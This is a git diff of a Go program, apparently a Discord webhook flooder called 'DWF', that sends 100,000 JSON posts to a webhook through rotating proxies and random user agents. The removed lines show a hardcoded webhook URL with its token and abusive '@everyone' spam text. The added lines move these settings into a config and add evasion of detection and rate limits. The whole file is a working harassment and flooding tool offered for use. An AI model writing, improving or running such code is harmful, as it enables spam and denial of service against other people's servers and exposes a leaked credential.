@@ -1,31 +1,33 @@
 package main
 
 import (
+	"bufio"
+	"encoding/json"
+	"fmt"
+	"github.com/admin100/util/console"
+	"github.com/corpix/uarand"
+	"github.com/gosuri/uilive"
 	"github.com/valyala/fasthttp"
 	"github.com/valyala/fasthttp/fasthttpproxy"
-	"github.com/admin100/util/console"
-    "time"
-    "fmt"
-    "bufio"
-    "os"
+	"math/rand"
+	"os"
 	"sync"
-    "math/rand"
-	"github.com/gosuri/uilive"
-	"encoding/json"
+	"time"
+	"main/utils"
 )
 
 
 var (
-	sentamt   int
-	workdamt  int
+	Config = utils.LoadConfig()
+
+	sentamt  int
+	workdamt int
 
 	start int
 	end   int
 
-	proxies   []string
-	threads   int
+	proxies []string
 
-	green  = "\x1b[38;5;77m"
 	red    = "\x1b[38;5;167m"
 	purple = "\x1b[38;5;57m"
 	pink   = "\x1b[38;5;128m"
@@ -46,10 +48,10 @@ func main() {
 
 	go TitleThread()
 	go ConsoleThread()
-	
+
 	start = int(time.Now().Unix())
 	wg := sync.WaitGroup{}
-    goroutines := make(chan struct{}, 1000)
+	goroutines := make(chan struct{}, Config.Threads)
 	for i := 0; i < 100000; i++ {
 		wg.Add(1)
 		go func() {
@@ -63,7 +65,7 @@ func main() {
 }
 
 func ConsoleThread() {
-	fmt.Printf(purple + `
+	fmt.Printf(purple+`
 		▓█████▄  █     █░  █████▒
 		▒██▀ ██▌▓█░ █ ░█░▓██   ▒ 
 		░██   █▌▒█░ █ ░█ ▒████ ░ 
@@ -87,16 +89,15 @@ func ConsoleThread() {
 		fmt.Fprintf(writer.Newline(), "\n%v[%v] %v[Running Fucker]%v", pink, time.Now().Format("15:04:05"), purple, reset)
 		time.Sleep(time.Millisecond * 5)
 		writer.Flush()
-}
+	}
 }
 
 func TitleThread() {
 	for {
-		console.SetConsoleTitle(fmt.Sprintf("imvast~DWF | Sent: %d/%d - Elapsed: %ds", workdamt, sentamt, (int(time.Now().Unix())-start)))
+		console.SetConsoleTitle(fmt.Sprintf("imvast~DWF | Sent: %d/%d - Elapsed: %ds", workdamt, sentamt, (int(time.Now().Unix()) - start)))
 		time.Sleep(500)
 	}
 }
-
 
 func SendReq() {
 	req := fasthttp.AcquireRequest()
@@ -106,15 +107,15 @@ func SendReq() {
 	defer fasthttp.ReleaseResponse(res)
 
 	values := map[string]string{
-		"content": ",\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n@everyone%20fuck%20you%20:see_no_evil:", 
-		"username": "trololoolol", 
-		"avatar_url": "https://pbs.twimg.com/profile_images/1113515508702175232/OEyLDylf_400x400.png"}
+		"content":    Config.Content,
+		"username":   "github.com/imvast",
+		"avatar_url": Config.AvatarUrl}
 	jsonValue, _ := json.Marshal(values)
 
 	req.Header.SetMethod("POST")
-	req.SetRequestURI("https://discord.com/api/webhooks/1048734774556102726/wvA0lGyYJU-fAg7ZlrVB9CU9BSO7U8pJu6g901AiX3mVwL4yAY45ZMz1vWQVrYGpXui5")
-    req.SetBody(jsonValue)
-	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36")
+	req.SetRequestURI(Config.Webhook)
+	req.SetBody(jsonValue)
+	req.Header.Set("user-agent", uarand.GetRandom())
 	req.Header.SetContentType("application/json")
 
 	proxy := proxies[rand.Intn(len(proxies))]
@@ -128,14 +129,12 @@ func SendReq() {
 		return //fmt.Printf(err.Error())
 	}
 	sentamt++
-	body := string(res.Body())
-	if len(body) == 0 {
-		body = "None"
-	}
+
 	if res.StatusCode() == 204 {
 		workdamt++
-	} else if res.StatusCode() == 429 {
-
+	} else if res.StatusCode() == 429 && Config.Debug == true{
+		body := string(res.Body())
+		fmt.Printf("[!] %v | %v", res.StatusCode(), body)
 	} else {
 		fmt.Println("check for error: res.StatusCode")
 	}
